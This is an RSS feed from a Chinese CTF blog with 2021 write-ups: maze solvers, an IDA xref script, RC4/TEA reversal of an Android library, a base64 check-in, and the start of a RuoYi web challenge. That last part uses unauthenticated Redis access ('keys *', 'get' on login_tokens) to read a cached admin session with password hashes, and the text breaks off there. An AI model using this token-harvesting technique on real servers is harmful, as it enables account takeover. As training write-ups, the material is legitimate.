<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Usher</title>
    <link>https://usher2008.github.io/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>a HUT ctfer</description>
    <pubDate>Mon, 02 Aug 2021 09:15:06 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>2021巅峰极客</title>
      <link>https://usher2008.github.io/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp/</link>
      <guid>https://usher2008.github.io/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp/</guid>
      <pubDate>Mon, 02 Aug 2021 09:00:24 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
比赛中没做出来，后面做的
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>比赛中没做出来，后面做的<a id="more"></a></blockquote><h1 id="Baby-maze"><a href="#Baby-maze" class="headerlink" title="Baby_maze"></a>Baby_maze</h1><p>这个 maze 与一般的 maze 不太一样,不能直接看到地图的全貌,只给你在某处的 WASD 的即移动回显</p><p>然后就写了个 python 处理,大概要用 17 分钟可以跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">nice = [<span class="string">'Just do it\n'</span>,<span class="string">'GOGOGO\n'</span>,<span class="string">'Wuhu~!\n'</span>,</span><br><span class="line"><span class="string">'You are so good\n'</span>,<span class="string">'Nice.\n'</span>,<span class="string">'Yeah~~~\n'</span>,</span><br><span class="line"><span class="string">"Let's go.\n"</span>,<span class="string">'So smart\n'</span>,<span class="string">'Never stop\n'</span>,<span class="string">'Wuhu\n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">'W'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">'S'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'S'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">'W'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'A'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">'D'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'D'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">'A'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb</span><span class="params">(flag,x,y)</span>:</span></span><br><span class="line"><span class="comment">#print flag</span></span><br><span class="line">xx = x</span><br><span class="line">yy = y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'WSAD'</span>:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">'W'</span>:</span><br><span class="line"><span class="keyword">if</span> maze[x][y<span class="number">-1</span>] != <span class="number">0</span>:<span class="comment">#0为未走过</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'S'</span>:</span><br><span class="line"><span class="keyword">if</span> maze[x][y+<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'A'</span>:</span><br><span class="line"><span class="keyword">if</span> maze[x<span class="number">-1</span>][y] != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'D'</span>:</span><br><span class="line"><span class="keyword">if</span> maze[x+<span class="number">1</span>][y] != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">sh.send(i)</span><br><span class="line">time.sleep(<span class="number">0.05</span>)<span class="comment">#以防recv不到</span></span><br><span class="line">recv = sh.recv()</span><br><span class="line"><span class="comment">#print recv</span></span><br><span class="line"><span class="keyword">if</span> str(recv) <span class="keyword">in</span> nice:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">'W'</span>:</span><br><span class="line">y -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'S'</span>:</span><br><span class="line">y += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'A'</span>:</span><br><span class="line">x -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'D'</span>:</span><br><span class="line">x += <span class="number">1</span></span><br><span class="line">maze[x][y] = <span class="number">2</span><span class="comment">#标记可走</span></span><br><span class="line">sb(flag + i,x,y)<span class="comment">#然后走</span></span><br><span class="line">sh.send(de(i))<span class="comment">#走回来</span></span><br><span class="line">sh.recv()</span><br><span class="line">x = xx</span><br><span class="line">y = yy</span><br><span class="line"><span class="keyword">elif</span> <span class="string">'md5'</span> <span class="keyword">in</span> recv:<span class="comment">#输出结果</span></span><br><span class="line">maze[x][y]=<span class="number">3</span></span><br><span class="line">print(flag+i)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'W'</span>:<span class="comment">#标记不可走</span></span><br><span class="line">maze[x][y<span class="number">-1</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'S'</span>:</span><br><span class="line">maze[x][y+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'A'</span>:</span><br><span class="line">maze[x<span class="number">-1</span>][y] = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="string">'D'</span>:</span><br><span class="line">maze[x+<span class="number">1</span>][y] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">maze=[<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">maze[i]=[<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">maze[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">2</span><span class="comment">#start处可走</span></span><br><span class="line">maze[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">2</span><span class="comment">#start往下走一步</span></span><br><span class="line">sh = process(<span class="string">'./maze'</span>)</span><br><span class="line">sh.send(<span class="string">'S'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">x = <span class="number">1</span></span><br><span class="line">y = <span class="number">2</span></span><br><span class="line">flag = <span class="string">'S'</span></span><br><span class="line">sb(flag,x,y)</span><br></pre></td></tr></table></figure><p>另一个大哥的脚本也比较牛,从ida的flag处往前推,推到起点输出flag,一秒钟不要就跑出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_one</span><span class="params">(addr, paths, flag)</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    to_handle_refs = []</span><br><span class="line">    <span class="keyword">for</span> xref <span class="keyword">in</span> XrefsTo(addr, <span class="number">0</span>):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        cur_fm = xref.frm</span><br><span class="line">        cur_start = idc.get_func_attr(cur_fm, FUNCATTR_START)</span><br><span class="line">        <span class="keyword">if</span> cur_start <span class="keyword">not</span> <span class="keyword">in</span> paths:</span><br><span class="line">            fm = cur_fm</span><br><span class="line">            fun_start = cur_start</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            to_handle_refs.append((fm, fun_start))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        rets = []</span><br><span class="line">        <span class="keyword">for</span> fm, fun_start <span class="keyword">in</span> to_handle_refs:</span><br><span class="line">            case_ea = fm - <span class="number">5</span></span><br><span class="line">            comment = idc.get_cmt(case_ea, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">assert</span> <span class="string">'case'</span> <span class="keyword">in</span> comment</span><br><span class="line">            c = (chr(int(comment.split(<span class="string">'case'</span>)[<span class="number">1</span>])))</span><br><span class="line">            rets.append((c, fun_start))</span><br><span class="line">        <span class="keyword">return</span> rets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x54DE35</span></span><br><span class="line">addr = start</span><br><span class="line">paths = []</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">queue = [(addr, paths, flag)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(queue) &gt; <span class="number">0</span>:</span><br><span class="line">    new_queue = []</span><br><span class="line">    <span class="comment">#print ('queue=%d, len=%d' %(len(queue), len(queue[0][2])))</span></span><br><span class="line">    <span class="keyword">for</span> addr, paths, flag <span class="keyword">in</span> queue:</span><br><span class="line">        <span class="comment">#print ('%x' %(addr))</span></span><br><span class="line">        rets = run_one(addr, paths, flag)</span><br><span class="line">        <span class="comment">#print ('ret=%s' %rets)</span></span><br><span class="line">        <span class="keyword">if</span> rets <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c, next_fun <span class="keyword">in</span> rets:</span><br><span class="line">            <span class="keyword">if</span> next_fun == <span class="number">0x40187c</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'succ:S%s'</span> %(flag+c)[::<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            new_queue.append((next_fun, paths+[addr], flag+c))</span><br><span class="line"></span><br><span class="line">    queue = new_queue.copy()</span><br></pre></td></tr></table></figure><h1 id="medical-app"><a href="#medical-app" class="headerlink" title="medical_app"></a>medical_app</h1><p>arm32才是原题目的so,其他版本的so都是编译器写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5[<span class="number">260</span>]; <span class="comment">// [sp+0h] [bp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v3) != <span class="number">36</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  z2(v5, (<span class="keyword">unsigned</span> __int8 *)d, <span class="number">0x10</span>u);<span class="comment">//RC4 init</span></span><br><span class="line">  z3(v5, (<span class="keyword">unsigned</span> __int8 *)v3, <span class="number">0x24</span>u);<span class="comment">//RC4</span></span><br><span class="line">  z4((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, <span class="number">9u</span>, d);<span class="comment">//tea</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(v3, &amp;ss, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下次见到有名字的函数,却没有发现调用的,可以猜测是编译器优化的so</p><p>优化一下 z4 函数,改成逆 tea 函数,再将 cmp 带入将输出填入在线 RC4,解得flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> d[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0x100</span>, <span class="number">0x1000</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> cmp[] = &#123; <span class="number">0x3E</span>, <span class="number">0x97</span>, <span class="number">0xE5</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x0C</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0xD4</span>, <span class="number">0xAF</span>, <span class="number">0x98</span>, <span class="number">0xE2</span>, <span class="number">0x9D</span>, <span class="number">0x4B</span>, <span class="number">0xFE</span>, <span class="number">0x0B</span>, <span class="number">0xB6</span>, <span class="number">0xA5</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0xD6</span>, <span class="number">0x36</span>, <span class="number">0x3D</span>, <span class="number">0xAF</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x41</span>, <span class="number">0xA0</span>, <span class="number">0x1A</span>, <span class="number">0xE7</span>, <span class="number">0x2C</span>, <span class="number">0x76</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum; <span class="comment">// r10</span></span><br><span class="line">    <span class="keyword">int</span> v11; <span class="comment">// r3</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> * ss = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)cmp;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        sum -= <span class="number">0x60A8894A</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v11 = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">8</span>; j &gt;= <span class="number">0</span> ; --j)</span><br><span class="line">            ss[j] -= ((((<span class="number">4</span> * ss[(j + <span class="number">1</span>) % <span class="number">9</span>]) ^ (ss[((j - <span class="number">1</span>) + <span class="number">9</span>) % <span class="number">9</span>] &gt;&gt; <span class="number">5</span>)) + ((ss[(j + <span class="number">1</span>) % <span class="number">9</span>] &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * ss[((j - <span class="number">1</span>) + <span class="number">9</span>) % <span class="number">9</span>]))) ^ ((d[j &amp; <span class="number">3</span> ^ v11] ^ ss[((j - <span class="number">1</span>) + <span class="number">9</span>) % <span class="number">9</span>]) + (ss[(j + <span class="number">1</span>) % <span class="number">9</span>] ^ sum)));</span><br><span class="line">        sum += <span class="number">0x60A8894A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>,cmp[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://inews.gtimg.com/newsapp_ls/0/13840355264/0" alt="image-20210802165404164"></p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>KCTF 2021春季赛</title>
      <link>https://usher2008.github.io/2021/06/01/KCTF%202021%20%E6%98%A5%E5%AD%A3%E8%B5%9B/</link>
      <guid>https://usher2008.github.io/2021/06/01/KCTF%202021%20%E6%98%A5%E5%AD%A3%E8%B5%9B/</guid>
      <pubDate>Tue, 01 Jun 2021 12:14:41 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
拿了件T恤 针不戳
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>拿了件T恤 针不戳<a id="more"></a></blockquote><h2 id="签到题-拜师学艺"><a href="#签到题-拜师学艺" class="headerlink" title="签到题 拜师学艺"></a>签到题 拜师学艺</h2><p>签到题很简单的啦,输入就这即可获得flag(bushi</p><p>首先我们丢进IDA里 很显然没壳</p><p>可以看见判断的代码奇奇怪怪的 定睛一看 很像是smc自解密</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599597720/0" alt=""></p><p>得嘞 那就跑起来看</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599597899/0" alt=""></p><p>可以看见走过去就已经变得不一样了  那么先对着 401266 按 u 再按 c </p><p>很好基本差不多识别出来了 再往下翻翻把漏掉的也按一下c 在跑到 main 的顶部按 p 识别为函数</p><p>然后终于可以 F5 啦</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598062/0" alt=""></p><p>大概可以直接猜出逻辑 比较输入的前几位和最后一位</p><p>然后把输入经过 sub_401050 这个函数之后再与一串字符串比较</p><p>看到这个字符串相信做题比较多的第一感觉就是 base64算法,要不就是base64换表</p><p>那么进去验证验证猜想</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598185/0" alt=""></p><p>ok 猜想正确 并且连表都没有换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">print(base64.b64decode(<span class="string">'ZmxhZ3trYW54dWV9'</span>))</span><br><span class="line"><span class="comment">#flag&#123;kanxue&#125;</span></span><br></pre></td></tr></table></figure><p>签到成功</p><h2 id="第二题-南冥神功"><a href="#第二题-南冥神功" class="headerlink" title="第二题 南冥神功"></a>第二题 南冥神功</h2><p>老规矩丢进IDA F5</p><p>将 F5 的代码分析如下</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598274/0" alt=""></p><p>用伪码简单说说</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>    = ...</span><br><span class="line">table  = ...</span><br><span class="line">input_ = row_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(input_) - <span class="number">1</span>):</span><br><span class="line">index = table.indexof(input[i])</span><br><span class="line">step1 = <span class="number">5</span> - (index + i) % <span class="number">6</span></span><br><span class="line">step2 = (index / <span class="number">6</span> + i) % <span class="number">6</span></span><br><span class="line">    <span class="built_in">run</span>(step1)</span><br><span class="line">    <span class="built_in">run</span>(step2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">map</span>:</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span></span><br><span class="line">        print('GG')</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print('you win!')</span><br></pre></td></tr></table></figure><p>run的规则是</p><blockquote><p>要走的地方不能是墙 x和y分别都不能越界</p><p>走了一步以后把当前位置标记为墙</p></blockquote><p>step对应的路</p><blockquote><p>1// 右移<br>4// 左移<br>2// 若y为奇数 则直下        若y为偶数 则往右下走<br>3// 若y为奇数 则往左下走 若y为偶数 则直下<br>5// 若y为奇数 则往左上走 若y为偶数 则直上<br>0// 若y为奇数 则直上        若y为偶数 则往右上走</p></blockquote><p>与常规迷宫不同的是满足特定条件可以往斜着走</p><p>其实可以看出来这个题就是我们 qq 里面经常玩的一笔画</p><p>路径就是这样</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598468/0" alt=""></p><p>转换成step就是</p><blockquote><p>1234321234321101210050543450501210121234322321</p></blockquote><p>step 就可以转换成 index 再转换成 table 中的字符 即 flag 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[] = <span class="string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> path[] = <span class="string">"1234321234321101210050543450501210121234322321"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; path[i]; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> step1 = path[i] - <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">int</span> step2 = path[i + <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">36</span>; ++j)</span><br><span class="line"><span class="keyword">if</span> (step1 == <span class="number">5</span> - (i / <span class="number">2</span> + j) % <span class="number">6</span> &amp;&amp; step2 == (i / <span class="number">2</span> + j / <span class="number">6</span>) % <span class="number">6</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, table[j]);</span><br><span class="line">&#125;<span class="comment">//GJ0V4LA4VKEVQZSVCNGJ00N</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证成功</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598566/0" alt=""></p><h2 id="第三题-统一门派"><a href="#第三题-统一门派" class="headerlink" title="第三题 统一门派"></a>第三题 统一门派</h2><p>这是一道web题</p><p>若依开源快速开发平台：<a href="https://gitee.com/y_project/RuoYi-Vue" target="_blank" rel="noopener">https://gitee.com/y_project/RuoYi-Vue</a></p><p>端口开放了 Redis 的 6379，可以进行未授权访问：</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598657/0" alt=""></p><p><code>keys *</code> 会发现存在一个缓存了用户登录 token 的 <code>login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333</code>（其它的都是别的师傅在打这个环境的时候留下的。。），可以 get 一下：<br><code>get &quot;login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\